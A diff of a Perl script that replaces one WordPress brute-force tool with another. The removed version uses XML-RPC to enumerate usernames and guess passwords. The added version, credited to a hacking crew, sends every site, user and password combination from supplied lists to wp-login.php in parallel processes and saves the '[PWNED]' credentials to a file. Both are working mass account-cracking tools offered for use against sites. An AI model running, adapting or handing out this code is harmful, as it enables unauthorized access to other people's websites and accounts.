@@ -1,155 +1,166 @@
-#!/usr/bin/perl -w
+#!/usr/bin/perl
+
 use strict;
-use threads;
-use threads::shared;
-use LWP::UserAgent;
-use Term::ANSIColor;
-### modules
-if($^O =~ /Win/){
-   system("cls");
-}else{
-   system("clear");
+use Getopt::Long;
+use WWW::Mechanize;
+use Parallel::ForkManager;
+
+my $distro; 
+my $usr = $^O;
+
+if ( $usr eq "MSWin32") {
+	system ("cls");
+} else {
+	system ("clear");
 }
-my $ua = LWP::UserAgent->new;
-$ua->timeout(15);
-$ua->agent('Mozilla/5.0');
-my $check = '<name>isAdmin</name>';
-my @linkz : shared;
-my @Passwords : shared;
-#### what we need :)
-flag();
-print color("bold blue"),"\n[+] Enter Website List  : ";
-print color 'reset';
-my $list=<STDIN>;
-chomp($list);
-print color("bold blue"),"[+] Enter Passwords list : ";
-print color 'reset';
-my $file=<STDIN>;
-chomp($file);
-print color("bold blue"),"[+] Enter Thread Number : ";
-print color 'reset';
-my $thread=<STDIN>;
-chomp($thread);
-my $threads = $thread;
-exploiter();
-sub exploiter {
-    GetWebs();
-    print color("bold yellow"),"[+] Quantity of website:";print color 'reset';print color("green")," " .scalar(@linkz)."\n";
-    GetPasswords();
-    print color("bold yellow"),"[+] Quantity of Passwords:";print color 'reset';print color("green")," " .scalar(@Passwords)."\n";
-    my $i=0;
-    foreach my $link( @linkz ){$i++;
-    print color ("bold cyan"),"\n[$i] $link";print color 'reset';    
-    print color ("bold green"),"\n    + Looking For Xmlrpc File";print color 'reset';
-    check_xmlrpc ($link);
-    print color ("bold green"),"\n    + Enumerating UserName ";print color 'reset';
-    get_user ($link);
-    print "\n";
-    }
+
+my (@splitar, @users, @sites, @pass, $site, $pm, $fm, $optListSites, 
+	$optListUsers, $optListPass, $optProcess, $optSave, $optHelp, $Save,$p);
+
+my $banner = @ARGV;
+print "\n-------------------------\n".
+	  "      WP BRUTE FORCE      \n".
+	  "-------------------------\n";
+	  
+
+GetOptions(    'list-site|l=s'  => \$optListSites,
+			   'list-user|u=s'     => \$optListUsers,
+			   'list-pass|p=s'       => \$optListPass,
+			   'list-save|s=s'       => \$optSave,
+			   'process|f=s'       => \$optProcess,
+			   'help|h'       => \$optHelp,
+			  );
+
+			
+		if ($optSave) {
+			  $Save = $optSave;
+		} else {
+			  $Save = "wp-checked.txt";
+		}
+		
+		if ($optProcess) {
+			  $p = $optProcess;
+		} else {
+			  $p = 20;
+		}
+		
+		if ($optHelp) { 
+			&banner;
+		}
+		
+if($banner <= 1){
+	print "\nCoder: v4p0r\n" .
+	"Team: Yunkers Crew && BRLZ PoC\n" .
+	"Twitter: 0x777null".
+	"Skype: drx.priv\n\n" .
+	"Usage: perl $0 --help\n";
+	
+	exit;
 }
-sub Wordpress {
-     my $ref = shift;
-        my ($Password,$dom,$usr) = @{$ref};
+		
+my $fm = $pm = Parallel::ForkManager-> new($p);
+
+open my $list, "< $optListSites" or die "[LIST-SITE NAO DEFINIDA]\n" ;
+open my $list2, "< $optListUsers" or die "[LIST-USER NAO DEFINIDA]\n" ;
+open my $list3, "< $optListPass"  or die "[LIST-PASS NAO DEFINIDA]\n" ;
+open my $outfile, "> $optSave";
+
+while (<$list>) {
+	chomp($_);
+	push @sites,$_;
+}
+
+while (<$list2>) {
+    chomp($_);
+    push @users,$_;
+}
+
+while (<$list3>) {
+    chomp($_);
+    push @pass,$_;
+}
+print "\n"."[PROCESSOS]: " .$p. "\n";
+print "[LISTA SALVA EM]: " .$Save. "\n";
+print "[TOTAL SITES]: " .scalar(@sites). "\n";
+print "[TOTAL USERS]: " .scalar(@users). "\n";
+print "[TOTAL SENHAS]: " .scalar(@pass). "\n\n";
+tempo();
+print "[TESTANDO A LISTA AGUARDE]"."\n\n";
+
+foreach $site (@sites) {
+
+	foreach my $user (@users) {
+		
+		foreach my $pass (@pass) {
+  
+		push @splitar, "$site|$user|$pass"; 
+		
+		}
+
+	}
+
+}
+
+
+foreach my $splitar1 (@splitar) {
+	
+	$fm->start and next;
+	my ($site,$usuario,$senha) = split/[|]/,$splitar1;
+	
+	if ($site !~ /^http:\/\//) {
+			$site = "http://" . $site;
+	} else {
+			$site = "https://" . $site;
+	}
+
+	if ($site !~ /\/wp-login.php/) {
+			$site = $site . "/wp-login.php";
+	}
+	
+	my $useragent = new LWP::UserAgent;
+	my $resposta = $useragent->post($site, 
+						[ log => $usuario,
+						  pwd => $senha,
+						 'wp-submit' => "Log in",
+						]);
  
-    my $target = "http://".$dom."/xmlrpc.php";
-        my $req = $ua->post($target , Content_Type => 'application/x-www-form-urlencoded', Content => "
-<methodCall>
-        <methodName>wp.getUsersBlogs</methodName>
-        <params>
-        <param><value><string>$usr</string></value></param>
-        <param><value><string>$Password</string></value></param>
-</params></methodCall>
-");
-                my $status = $req->content;
-                if($status =~ /$check/){
-                        print "\n\t    +[CRACKED]-> ($usr : $Password)\n\n";
-        }
-                else {
-                    print"        -> ($usr : $Password) faild\n";
-                }
-        threads->detach();
-        }
- 
-sub GetPasswords {
-        open( LNK, "$file" ) or die "$!\n";
-        while( defined( my $line_ = <LNK> ) ) {
-                chomp( $line_ );
-                push( @Passwords, $line_ );
-        }
-        close( LNK );
+	my $cracked = $resposta->code;
+
+	if($cracked =~ /302/){
+		tempo();
+		print "[PWNED]: " .$site. " | " .$usuario. " | " .$senha. "\n";
+		
+		open(my $fh, '>>', $Save);
+		print $fh "[PWNED]: " .$site. " | " .$usuario. " | " .$senha. "\n";
+		close $fh;
+		
+	}
+	$fm->finish();
 }
-sub  get_user {
-my $y = toma("http://".$_[0]."/?author=1");
-    if ($y=~/<title>(.*?) | (.*?)<\/title>/){
-        if(!defined($1))
-            {
-            my $user = "admin";
-            chomp($user);
-            print "\n        + Using default user [admin]\n";
-            print color ("bold green"),"\n    +[OK] Bruting via xmlrpc\n\n";print color 'reset';
-            foreach my $Password( @Passwords ) {
-                my  $ctr = 0;
-                foreach my $thr ( threads->list ) { $ctr++; }
-                if ($ctr < $threads){
-                        threads->create( \&Wordpress, [$Password,$_[0],$user]);
-                }
-                else { redo; }
-                while (threads->list) {}
-        }
-           
-            }
-            else{
-                my $user = $1;
-                print color ("bold blue"),"\n        + User is : ";print color ("red")," $user\n";print color 'reset';
-                chomp($user);
-                print color ("bold green"),"\n    +[OK] Bruting via xmlrpc\n\n";print color 'reset';
-                foreach my $Password( @Passwords ) {
-                my  $ctr = 0;
-                foreach my $thr ( threads->list ) { $ctr++; }
-                if ($ctr < $threads){
-                        threads->create( \&Wordpress, [$Password,$_[0],$user]);
-                }
-                else { redo; }
-                while (threads->list) {}
-        }
-               
-                }        
-    }
+
+sub tempo {
+  my ($segundos,$minutos,$hora) = localtime();
+  print "[";
+  print "$hora:$minutos:$segundos";
+  print "]";
 }
-sub check_xmlrpc {
-    my $x = toma ("http://".$_[0]."/xmlrpc.php");
-    if ($x =~/accepts POST/) {
-        print color ("bold blue"),"\n        + xmlrpc file founded : ";print color 'reset';
-    }
-    else {
-        print color ("bold white"),"\n        + xmlrpc file Not founded ";print color 'reset';
-       
-    }
-   
-}
-sub GetWebs {
-        open( DOM, "$list" ) or die "$!\n";
-        while( defined( my $line_ = <DOM> ) ) {
-                chomp( $line_ );
-                push( @linkz, $line_ );
-        }
-        close( DOM );
-}
- 
-sub toma {
-    return $ua->get( $_[0] )->content;
-}
-sub flag {
-    print q{
- __   ______             _              ____          _  __         _     _ ____       _           
- \ \ / /  _ \           | |            |  _ \        | |/ /        | |   | |___ \     | |          
-  \ V /| |_) |_ __ _   _| |_ ___ _ __  | |_) |_   _  | ' / __ _  __| | __| | __) | ___| |__  _   _ 
-   > < |  _ <| '__| | | | __/ _ \ '__| |  _ <| | | | |  < / _` |/ _` |/ _` ||__ < / __| '_ \| | | |
-  / . \| |_) | |  | |_| | ||  __/ |    | |_) | |_| | | . \ (_| | (_| | (_| |___) | (__| | | | |_| |
- /_/ \_\____/|_|   \__,_|\__\___|_|    |____/ \__, | |_|\_\__,_|\__,_|\__,_|____/ \___|_| |_|\__, |
-                                               __/ |                                          __/ |
-                                              |___/                                          |___/ 
-                                                                                                                                                                                                                     
-                              
-   };
+
+sub banner {
+print q{};
+print "\nUsage: $0 [comando]\n".
+		  "[+] Comandos:\n".
+		  "--help         [Ajuda com os comandos]\n".
+		  "--list-site|l  [Seleciona sua lista de sites]\n".
+		  "--list-user|u  [Seleciona sua lista de user]\n".
+		  "--list-pass|p  [Seleciona sua lista de pass]\n".
+		  "--list-save|s  [Onde a lista sera salva]\n".
+		  "--process|f    [Quantidade de Processos]\n".
+		  "               [Defaut 20]\n\n".
+		  "[!] Exemplos:\n".
+		  "perl $0 --l sites.txt --u user.txt --p pass.txt --f 100\n".
+		  "perl $0 --l sites.txt --u user.txt --p pass.txt --f 100 --s cracked.txt\n".
+		  "perl $0 --list-site sites.txt --list-user user.txt --list-pass pass.txt --process 100\n".
+		  "perl $0 --list-site sites.txt --list-user user.txt --list-pass pass.txt --process 100 --s cracked.txt\n";
+    exit;
+
 }
